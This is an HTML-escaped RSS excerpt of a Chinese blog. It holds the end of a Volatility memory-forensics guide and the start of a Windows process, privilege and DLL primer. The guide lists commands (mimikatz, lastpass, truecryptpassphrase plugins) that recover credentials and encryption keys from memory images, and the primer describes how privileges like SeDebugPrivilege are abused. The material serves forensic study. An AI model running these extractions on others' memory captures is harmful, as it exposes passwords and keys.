&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install &lt;span style=&#34;color:#e06c75&#34;&gt;construct&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;2.5.2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deactivate
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随后就可以使用了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; mimikatz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708203501496.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250708203501496&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看chrome记录的登录密码lastpass&#34;&gt;查看Chrome记录的登录密码（lastpass）
&lt;/h3&gt;&lt;p&gt;需要下载插件&lt;code&gt;lastpass&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; lastpass
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;获取truecrypt秘钥信息truecryptmaster&#34;&gt;获取TrueCrypt秘钥信息（truecryptmaster）
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; truecryptmaster 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;获取truecrypt密码信息-truecryptpassphrase&#34;&gt;获取TrueCrypt密码信息 （truecryptpassphrase）
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; truecryptpassphrase 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;文件扫描与提取&#34;&gt;文件扫描与提取
&lt;/h2&gt;&lt;h3 id=&#34;扫描内存中的文件filescan&#34;&gt;扫描内存中的文件（filescan）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-24&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; filescan 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果知道具体文件名称（&lt;code&gt;-i&lt;/code&gt;忽略大小写）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; filescan | grep -i &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;secret.txt&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果想找指定文件类型（&lt;code&gt;-E&lt;/code&gt;正则匹配）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; filescan | grep  -E &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;jpg|png|jpeg|bmp|gif&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706184859261.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250706184859261&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最前面的十六进制是文件地址&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-24&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.filescan.FileScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250717182605948.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250717182605948&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;从内存中转储指定文件dumpfiles&#34;&gt;从内存中转储指定文件（dumpfiles）
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;filescan&lt;/code&gt;插件扫描的是&lt;code&gt;_FILE_OBJECT&lt;/code&gt;这样的内核结构，相当于找到了文件的档案卡&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dumpfiles&lt;/code&gt;插件则是根据这张档案卡的指引，去内存中寻找文件的具体内容&lt;/p&gt;
&lt;p&gt;如果文件的内容当时没有被加载到内存（RAM）中，或者已经被操作系统置换到了页面文件（pagefile.sys）里，那么&lt;code&gt;dumpfiles&lt;/code&gt;就无法从内存镜像中提取出完整的文件数据&lt;/p&gt;
&lt;h4 id=&#34;volatility2-25&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;配置文件&amp;gt; dumpfiles -Q &amp;lt;物理地址&amp;gt; -D &amp;lt;目录&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;下载的文件是.data文件，改后缀或使用foremost等工具分析&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-25&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; -o &amp;lt;目录&amp;gt; windows.dumpfiles.DumpFiles --physaddr &amp;lt;物理地址&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;从内存中搜索字符串-strings&#34;&gt;从内存中搜索字符串 (strings)
&lt;/h3&gt;&lt;p&gt;Volatility3有&lt;code&gt;windows.strings.Strings&lt;/code&gt;插件，不过不太好用，我们主要目的还是搜索字符串&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常见的用法是先用&lt;code&gt;memdump&lt;/code&gt;转储出某个可疑进程的内存文件，然后对这个小文件执行&lt;code&gt;strings&lt;/code&gt;，这样目标更明确，噪音也更少：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;strings 1234.dmp | grep -i &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;关键词&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>windows相关知识总结（下）</title>
        <link>https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/</link>
        <pubDate>Mon, 21 Jul 2025 12:18:54 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/</guid>
        <description>&lt;p&gt;&lt;strong&gt;windows相关知识总结（上）：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;进程&#34;&gt;进程
&lt;/h1&gt;&lt;h2 id=&#34;常见进程&#34;&gt;常见进程
&lt;/h2&gt;&lt;h3 id=&#34;初始化进程&#34;&gt;初始化进程
&lt;/h3&gt;&lt;h4 id=&#34;system&#34;&gt;System
&lt;/h4&gt;&lt;p&gt;进程ID通常为4，是内核级线程的宿主，是运行&lt;code&gt;ntoskrnl.exe&lt;/code&gt;的容器&lt;/p&gt;
&lt;p&gt;（&lt;code&gt;ntoskrnl.exe&lt;/code&gt;负责内存管理、进程/线程调度、硬件抽象、系统调用处理等功能）&lt;/p&gt;
&lt;p&gt;它是进程树的根，没有父进程，如果看到有用户模式的进程成为它的子进程，需要高度警惕&lt;/p&gt;
&lt;h4 id=&#34;smssexe&#34;&gt;smss.exe
&lt;/h4&gt;&lt;p&gt;会话管理器子系统，负责创建新的用户会话，是系统中的第一个真实进程&lt;/p&gt;
&lt;p&gt;它会启动&lt;code&gt;csrss.exe&lt;/code&gt;和&lt;code&gt;winlogon.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;csrssexe&#34;&gt;csrss.exe
&lt;/h4&gt;&lt;p&gt;客户端/服务器运行时子系统，负责管理窗口、线程和控制台等，每个会话中都会有一个实例&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;smss.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;wininitexe&#34;&gt;wininit.exe
&lt;/h4&gt;&lt;p&gt;Windows初始化进程，在系统引导时启动，会一直保留在后台运行&lt;/p&gt;
&lt;p&gt;它的核心任务是启动三个关键进程：&lt;code&gt;services.exe&lt;/code&gt;、&lt;code&gt;lsass.exe&lt;/code&gt;和&lt;code&gt;lsm.exe&lt;/code&gt;，任何其他进程都值得审查&lt;/p&gt;
&lt;p&gt;其父进程应为空&lt;/p&gt;
&lt;h4 id=&#34;winlogonexe&#34;&gt;winlogon.exe
&lt;/h4&gt;&lt;p&gt;Windows 登录管理器，负责处理用户的交互式登录与注销过程，并加载用户配置文件&lt;/p&gt;
&lt;p&gt;在用户成功登录后，它会负责启动&lt;code&gt;userinit.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;smss.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;userinitexe&#34;&gt;userinit.exe
&lt;/h4&gt;&lt;p&gt;用户初始化进程，负责在用户登录后执行登录脚本、恢复网络连接，并启动用户外壳程序（Shell）&lt;/p&gt;
&lt;p&gt;它在启动了用户的桌面环境（默认为 &lt;code&gt;explorer.exe&lt;/code&gt;）后会立刻退出，&lt;strong&gt;因此在正常的进程列表中几乎看不到它&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;winlogon.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;explorerexe&#34;&gt;explorer.exe
&lt;/h4&gt;&lt;p&gt;Windows资源管理器，也是用户登录后启动的第一个进程，是所有用户图形化操作的起点&lt;/p&gt;
&lt;p&gt;在一个标准的 Windows 会话中，它有四个功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;文件管理器&lt;/strong&gt;：打开“我的电脑”时看到的那些文件和文件夹窗口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;任务栏与开始菜单&lt;/strong&gt;：屏幕底部的任务栏、开始按钮、系统托盘区&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;桌面图标管理器&lt;/strong&gt;：桌面图标，以及对它们的点击、拖拽等交互&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;桌面背景绘制&lt;/strong&gt;：桌面壁纸等&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;恶意软件经常向其注入DLL，以获取用户权限并保持持久化&lt;/p&gt;
&lt;h3 id=&#34;核心服务进程&#34;&gt;核心服务进程
&lt;/h3&gt;&lt;h4 id=&#34;servicesexe&#34;&gt;services.exe
&lt;/h4&gt;&lt;p&gt;服务控制管理器，负责启动和管理所有系统服务，是所有通过正常方式启动的&lt;code&gt;svchost.exe&lt;/code&gt;的父进程&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;wininit.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;lsassexe&#34;&gt;lsass.exe
&lt;/h4&gt;&lt;p&gt;本地安全机构子系统服务，内存中存放着用户的密码哈希等敏感凭证，系统中必须有且只有一个实例&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;wininit.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;lsmexe&#34;&gt;lsm.exe
&lt;/h4&gt;&lt;p&gt;本地会话管理器服务，处理与用户登录、注销、远程桌面连接和快速用户切换相关的终端服务&lt;/p&gt;
&lt;p&gt;其父进程必须是&lt;code&gt;wininit.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;svchostexe&#34;&gt;svchost.exe
&lt;/h4&gt;&lt;p&gt;服务宿主进程，是 Windows 系统中的一个核心进程，专门用作运行各种系统服务的“容器”或“宿主”&lt;/p&gt;
&lt;p&gt;它也是最常见的伪装和注入目标：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;父进程&lt;/strong&gt;：必须是&lt;code&gt;services.exe&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;文件路径&lt;/strong&gt;：必须位于&lt;code&gt;C:\Windows\System32\&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络连接&lt;/strong&gt;：它承载的系统服务中，哪些建立了网络连接，连接到哪里&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;脚本执行进程&#34;&gt;脚本执行进程
&lt;/h3&gt;&lt;h4 id=&#34;rundll32exe&#34;&gt;rundll32.exe
&lt;/h4&gt;&lt;p&gt;用于执行DLL文件中的函数，攻击者常用它来加载恶意DLL，从而绕过基于程序名的检测&lt;/p&gt;
&lt;p&gt;分析时应关注其父进程是谁，以及它加载了哪个DLL&lt;/p&gt;
&lt;h4 id=&#34;powershellexe&#34;&gt;powershell.exe
&lt;/h4&gt;&lt;p&gt;是命令行和脚本引擎，现代无文件攻击的首选工具&lt;/p&gt;
&lt;p&gt;任何&lt;code&gt;powershell.exe&lt;/code&gt;的出现都值得审查，特别是其命令行参数中是否包含编码（&lt;code&gt;-e&lt;/code&gt;）、混淆或下载链接&lt;/p&gt;
&lt;h4 id=&#34;conhostexe&#34;&gt;conhost.exe
&lt;/h4&gt;&lt;p&gt;控制台窗口主机，为&lt;code&gt;cmd.exe&lt;/code&gt;等命令行程序提供交互界面&lt;/p&gt;
&lt;p&gt;它的内存中存储了该命令行窗口中所有输入过的命令和输出过的结果&lt;/p&gt;
&lt;h2 id=&#34;进程权限&#34;&gt;进程权限
&lt;/h2&gt;&lt;h3 id=&#34;系统级核心特权&#34;&gt;系统级核心特权
&lt;/h3&gt;&lt;h4 id=&#34;setcbprivilege&#34;&gt;SeTcbPrivilege
&lt;/h4&gt;&lt;p&gt;**这是Windows中权限最高、最强大的特权之一。**全称是作为操作系统的一部分(Act as part of the operating system)，通常被称为可信计算基（Trusted Computer Base, TCB）特权&lt;/p&gt;
&lt;p&gt;拥有此特权的进程被视为系统核心信任的一部分，可以执行几乎任何操作，包括创建安全令牌来冒充任何用户，除了极少数核心系统进程，任何程序都不应拥有它&lt;/p&gt;
&lt;h4 id=&#34;sedebugprivilege&#34;&gt;SeDebugPrivilege
&lt;/h4&gt;&lt;p&gt;**调试程序特权。**它授予一个进程附加到其他任意进程并检查、修改其内存的能力&lt;/p&gt;
&lt;p&gt;攻击者常利用它来从&lt;code&gt;lsass.exe&lt;/code&gt;中窃取密码，除了调试器和核心安全软件，任何普通程序（如记事本、浏览器）拥有它都极度可疑&lt;/p&gt;
&lt;h4 id=&#34;seloaddriverprivilege&#34;&gt;SeLoadDriverPrivilege
&lt;/h4&gt;&lt;p&gt;**加载和卸载设备驱动程序特权。**它授予一个进程将内核模式驱动程序（&lt;code&gt;.sys&lt;/code&gt;文件）加载到Windows内核中或从内核中卸载的能力&lt;/p&gt;
&lt;p&gt;这是通往内核模式的入口，恶意软件一旦获得此特权，就可以加载自己的恶意驱动，从而隐藏文件、进程、网络连接，并完全绕过用户态的安全软件&lt;/p&gt;
&lt;h3 id=&#34;安全与审计特权&#34;&gt;安全与审计特权
&lt;/h3&gt;&lt;h4 id=&#34;setakeownershipprivilege&#34;&gt;SeTakeOwnershipPrivilege
&lt;/h4&gt;&lt;p&gt;**获取对象所有权特权。**它授予进程获取系统上任何安全对象（如文件、文件夹、注册表项）的所有权的能力，即使该进程原本没有访问该对象的权限&lt;/p&gt;
&lt;p&gt;攻击者获得它之后，就可以强行霸占受系统保护的文件或注册表键，然后赋予自己读写权限，进而篡改系统配置或替换核心文件&lt;/p&gt;
&lt;h4 id=&#34;sebackupprivilege&#34;&gt;SeBackupPrivilege
&lt;/h4&gt;&lt;p&gt;**备份文件和目录特权，可以做到读取一切。**它允许进程在读取文件时，绕过所有常规的文件和目录权限检查（ACL），其初衷是让备份软件可以备份系统上的所有文件&lt;/p&gt;
&lt;p&gt;数据窃取类木马和勒索软件经常利用此特权来读取它们本无权访问的敏感用户文档、数据库文件或配置文件，以便进行窃取或加密&lt;/p&gt;
&lt;h4 id=&#34;serestoreprivilege&#34;&gt;SeRestorePrivilege
&lt;/h4&gt;&lt;p&gt;**还原文件和目录特权，可以做到写入一切。**与&lt;code&gt;SeBackupPrivilege&lt;/code&gt;对应，它允许进程在写入文件时，绕过所有权限检查&lt;/p&gt;
&lt;p&gt;恶意软件可以利用它来覆盖受保护的系统文件、在系统目录中释放恶意程序，或修改锁定的配置文件以实现持久化&lt;/p&gt;
&lt;h4 id=&#34;sesecurityprivilege&#34;&gt;SeSecurityPrivilege
&lt;/h4&gt;&lt;p&gt;**管理审核和安全日志特权，可以做到删除痕迹。**主要允许进程查看和清空 Windows 安全事件日志&lt;/p&gt;
&lt;p&gt;攻击者在完成入侵后，会利用这个特权来清空安全日志，从而抹去自己的登录尝试、账户创建、权限使用等痕迹&lt;/p&gt;
&lt;h3 id=&#34;常规特权&#34;&gt;常规特权
&lt;/h3&gt;&lt;h4 id=&#34;seshutdownprivilege&#34;&gt;SeShutdownPrivilege
&lt;/h4&gt;&lt;p&gt;**关闭系统特权。**授予进程关闭本地计算机的权力&lt;/p&gt;
&lt;h4 id=&#34;seimpersonateprivilege&#34;&gt;SeImpersonatePrivilege
&lt;/h4&gt;&lt;p&gt;**身份验证后模拟客户端特权。**通常授予服务类账户，允许一个服务进程模拟连接到它的客户端的安全上下文&lt;/p&gt;
&lt;p&gt;攻击者可以诱使一个高权限进程（如SYSTEM）来连接自己，然后利用此特权“模拟”这个高权限进程，从而将自己从一个低权限的服务账户提升到&lt;code&gt;SYSTEM&lt;/code&gt;权限&lt;/p&gt;
&lt;h4 id=&#34;sechangenotifyprivilege&#34;&gt;SeChangeNotifyPrivilege
&lt;/h4&gt;&lt;p&gt;**绕过遍历检查特权。**它允许进程在访问一个对象时，无需检查路径中所有上级目录的权限&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这是一个正常无害的特权，Windows 默认会将其授予所有用户，包括最低权限的用户&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;dll&#34;&gt;DLL
&lt;/h1&gt;&lt;h2 id=&#34;什么是dll&#34;&gt;什么是DLL
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”&lt;/strong&gt;，是软件文件类型&lt;/p&gt;
&lt;p&gt;在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中，当我们执行某一个程序时，相应的DLL文件就会被调用&lt;/p&gt;
&lt;p&gt;一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件&lt;/p&gt;
&lt;p&gt;DLL文件中存放的是各类程序的函数(子过程)实现过程，当程序需要调用函数时需要先载入DLL，然后取得函数的地址，最后进行调用&lt;/p&gt;
&lt;p&gt;使用DLL文件的好处是程序不需要在运行之初加载所有代码，只有在程序需要某个函数的时候才从DLL中取出&lt;/p&gt;
&lt;h2 id=&#34;dll的调用方式&#34;&gt;DLL的调用方式
&lt;/h2&gt;&lt;h3 id=&#34;1-静态调用--隐式链接&#34;&gt;1. 静态调用 / 隐式链接
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在运行程序前，必须先把所有的DLL都准备好，少一个都不行&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在编译程序的时候，开发者就已经在代码中明确声明了需要用到哪些DLL里的哪些函数&lt;/li&gt;
&lt;li&gt;这些依赖关系被记录在最终生成的可执行文件（&lt;code&gt;.exe&lt;/code&gt;）的头部，一个叫做“导入表“（Import Table）的地方&lt;/li&gt;
&lt;li&gt;当运行这个.exe文件时，Windows加载器会首先读取这个表&lt;/li&gt;
&lt;li&gt;加载器会根据导入表的信息，在硬盘上找到所有必需的DLL文件，并将它们加载到该进程的内存空间中&lt;/li&gt;
&lt;li&gt;所有函数地址都链接好之后，程序的主代码才开始执行&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;2-动态调用--显式链接&#34;&gt;2. 动态调用 / 显式链接
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在运行程序前，不需要把所有的DLL都准备好，少了哪个就引入哪个&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;程序在编译时，并不知道自己会用到哪些DLL&lt;/li&gt;
&lt;li&gt;程序在运行过程中，根据当时的逻辑判断，临时决定需要某个DLL的功能&lt;/li&gt;
&lt;li&gt;程序会调用特定的WindowsAPI函数来手动加载这个DLL
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;LoadLibrary()&lt;/code&gt;：这个函数用来将指定的DLL文件加载到内存中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GetProcAddress()&lt;/code&gt;：加载成功后，用这个函数从DLL中获取特定函数的地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;拿到函数地址后，程序就可以像调用自己的函数一样调用它了&lt;/li&gt;
&lt;li&gt;当不再需要时，可以调用&lt;code&gt;FreeLibrary()&lt;/code&gt;将其从内存中卸载&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;常见dll&#34;&gt;常见DLL
&lt;/h2&gt;&lt;h3 id=&#34;核心系统库-几乎所有进程都会加载&#34;&gt;核心系统库 (几乎所有进程都会加载)
&lt;/h3&gt;&lt;h4 id=&#34;ntdlldll&#34;&gt;ntdll.dll
&lt;/h4&gt;&lt;p&gt;WindowsNT核心库，是用户态程序与系统内核之间最底层的接口，封装了大量的系统调用，例如进程和线程的创建、内存管理、文件I/O以及与内核对象的交互&lt;/p&gt;
&lt;p&gt;其他更高层的核心库（如&lt;code&gt;kernel32.dll&lt;/code&gt;）最终也需要调用&lt;code&gt;ntdll.dll&lt;/code&gt;中的函数来完成实际的工作&lt;/p&gt;
&lt;h4 id=&#34;kernel32dll--kernelbasedll&#34;&gt;kernel32.dll / kernelbase.dll
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;kernel32.dll&lt;/code&gt;是Windows中最核心的用户模式库之一，为应用程序提供了访问操作系统的基础功能，如内存管理、文件I/O和进程线程管理&lt;/p&gt;
&lt;p&gt;从Windows7开始，许多&lt;code&gt;kernel32.dll&lt;/code&gt;的核心功能被重构并移入了&lt;code&gt;kernelbase.dll&lt;/code&gt;，而&lt;code&gt;kernel32.dll&lt;/code&gt;本身则更多地作为调用这些新功能的一个“转发层”&lt;/p&gt;
